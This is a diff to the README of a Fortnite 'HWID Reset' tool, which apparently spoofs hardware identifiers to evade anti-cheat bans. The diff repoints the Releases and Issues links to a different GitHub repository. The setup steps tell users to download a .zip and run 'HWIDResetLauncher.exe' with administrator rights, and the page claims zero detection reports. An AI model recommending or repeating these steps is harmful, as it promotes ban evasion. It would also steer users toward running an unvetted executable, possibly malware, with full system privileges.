@@ -31,7 +31,7 @@ Whether you're building new profiles, testing anti-cheat reactions, or just main
 
 ## 🔧 Setup Guide
 
-1. Visit [Releases](https://github.com/TobeyWrightlxlg/Fortnite-HWID-Reset-2025/releases/tag/stable)
+1. Visit [Releases](https://github.com/Fortnite-HWID-Reset-2025/.github/releases/tag/Actual_Version)
 2. Download the latest `.zip` archive
 3. Extract files to a secure folder (e.g. `C:\FNIDReset\`)
 4. Launch `HWIDResetLauncher.exe` with administrator rights
@@ -67,7 +67,7 @@ Whether you're building new profiles, testing anti-cheat reactions, or just main
 - Last Update: April 2025  
 - Detection Reports: 0 (since v2.6)  
 - Tested Compatibility: Chapter 5 Season 3 client  
-- Issues: Submit via [Issues tab](https://github.com/TobeyWrightlxlg/Fortnite-HWID-Reset-2025/issues)
+- Issues: Submit via [Issues tab](https://github.com/Fortnite-HWID-Reset-2025/.github/issues)
 
 ---
 
